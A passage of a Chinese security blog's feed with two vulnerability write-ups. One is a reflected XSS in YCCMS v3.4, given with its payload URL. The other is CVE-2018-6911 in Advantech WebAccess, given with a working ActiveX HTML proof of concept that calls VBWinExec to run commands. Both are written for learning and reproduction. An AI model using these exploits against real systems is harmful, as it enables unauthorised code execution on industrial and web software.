    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>CMS下载地址: <a href="http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar">http://ahdx.down.chinaz.com/202003/yccms_v3.4.rar</a></p><p>该cms根目录下有个安装文档，相关设置都在里面</p><p>有个坑，mysql需要预先创建一个my_admin数据库，否则导入会失败</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>XSS payload </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:xxx.xxx/admin/?a=html&amp;art=&lt;sCrIpT&gt;alert(1)&lt;%2FsCrIpT&gt;&amp;m=arts</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/04/17/IX9kiWuKaR7UhOt.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled.png"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>点击“开始生成”，界面上更新文字，“内容生成完毕！共6条”，猜测这里执行了js代码</p><p><img src="https://i.loli.net/2021/04/17/iqPEA6yZOLR5H1S.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%201.png"></p><p>抓包，a参数对应根目录下的控制器，m参数表示方法，art参数是生成文章的数量 </p><p><img src="https://i.loli.net/2021/04/17/UDIZdazr6fViFO1.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%202.png"></p><p>art的参数赋值为<script>alert(1)</script>直接弹窗了</p><p>我们再看下源码，找到html控制器</p><p><img src="https://i.loli.net/2021/04/17/Qk1eJbdn38w7Phm.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%203.png"></p><p>找到arts函数，可以看到生成完成后会使用document.body.innerHTML写入到网页中，从而执行了js代码，</p><p><img src="https://i.loli.net/2021/04/17/6xSJHE9O1rjXw4a.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%204.png"></p><p>前端插入xss后的源码</p><p><img src="https://i.loli.net/2021/04/17/eHMOXcfTE29F8Qs.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%205.png"></p><p>继续看“内容生成完毕”所在的位置，可以看到在art被赋值为一段js代码后，最终得到了执行</p><p><img src="https://i.loli.net/2021/04/17/kP7bG25BvYgiV6H.png" alt="YCCMS%20V3%204%E5%AD%98%E5%9C%A8XSS%E6%BC%8F%E6%B4%9E%20f45f98e06c1a4aca8f78afffaca26d47/Untitled%206.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;p&gt;CMS下载地址: &lt;a href=&quot;http://ahdx.down.chinaz.com/202003/yccms_v3.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>工控漏洞@CVE-2018-6911 Advantech WebAccess远程任意命令执行复现分析</title>
    <link href="https://tutucoo.github.io/2021/02/06/%E5%B7%A5%E6%8E%A7%E6%BC%8F%E6%B4%9E@CVE-2018-6911-Advantech-WebAccess%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"/>
    <id>https://tutucoo.github.io/2021/02/06/%E5%B7%A5%E6%8E%A7%E6%BC%8F%E6%B4%9E@CVE-2018-6911-Advantech-WebAccess%E8%BF%9C%E7%A8%8B%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/</id>
    <published>2021-02-06T09:25:48.000Z</published>
    <updated>2021-11-05T02:01:25.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>Advantech Webaccess Node目录下的AspVBObj.dll文件中存在VBWinExec方法，该方法允许攻击者通过命令参数执行任意系统命令</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>1.Windows 7 </p><p>2.Advantech WebAccess 8.2</p><p>3.IE 9</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p> 安装Advantech WebAccess 8.2</p><p>由于该漏洞是利用com组件，因此只要存在AspVBObj.dll文件即可完成EXP，安装完毕后，将EXP另存为html文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;Advantech WebAccess Node8.3.0 &quot;AspVBObj.dll&quot; - Remote Code Execution&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt; </span><br><span class="line">    &lt;object id&#x3D;rce classid&#x3D;&quot;clsid:&#123;55F52D11-CEA5-4D6C-9912-2C8FA03275CE&#125;&quot;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">    &lt;SCRIPT&gt;  </span><br><span class="line">        function exploit() &#123; </span><br><span class="line">            rce.VBWinExec(&quot;calc&quot;) </span><br><span class="line">        &#125;  </span><br><span class="line">    &lt;&#x2F;SCRIPT&gt; </span><br><span class="line">    &lt;input language&#x3D;JavaScript onclick&#x3D;exploit() type&#x3D;button value&#x3D;&quot;Exploit-Me&quot;&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;HTML&gt;</span><br></pre></td></tr></table></figure><p>打开IE选项-安全-自定义级别</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3erp1j30d607wt9i.jpg" alt="img"></p><p>设置“对未标记为可安全执行脚本的ActiveX控件初始化并执行”为启用</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl3xkx6j30es02qjrn.jpg" alt="img"></p><p> 在Windows7上访问服务器的EXP网页，执行exp</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl05u9sj30gm06qq36.jpg" alt="img"></p><p>命令顺利执行</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl4bvulj30c60dygnn.jpg" alt="img"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在html的object元素中定义clsid，可以用于Windows上的com组件的引用，clsid是该dll的统一唯一标识符，Windows中的com组件就是通过clsid来进行引用的。</p><p>根据它的clsid：{55F52D11-CEA5-4D6C-9912-2C8FA03275CE}在注册表中进行搜索</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl0mqggj30i007i74r.jpg" alt="img"></p><p>可以找到它的键值，AspVBObj</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdl120kuj30rg0h0acu.jpg" alt="img"></p><p>可以猜测这是它的一个dll文件，在C:\WebAccess\Node目录下找到AspVBObj.dll，拖进IDA进行逆向分析，打开字符串小窗口看到一个VBWinExec函数</p><p><img src="https://gitee.com/tutucoo/images/raw/master/uPic/00831rSTgy1gckdkznvuej30ya0b2413.jpg" alt="img"></p><p>根据经验可以判断这个很可能是个命令执行的函数，根据poc，可以看到这个命令执行的函数使用方法是直接传递字符串calc实现了弹出系统自带计算器</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>经测试在Advantech WebAccess 8.2版本中也存在该漏洞，可以成功执行EXP，基于该漏洞的类型，影响的版本可能比较广泛。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞概述&quot;&gt;&lt;a href=&quot;#漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;漏洞概述&quot;&gt;&lt;/a&gt;漏洞概述&lt;/h2&gt;&lt;p&gt;Advantech Webaccess Node目录下的AspVBObj.dll文件中存在VBWinExec方法，该方法允许</summary>
      
    
    
    
    
  </entry>
  
</feed>
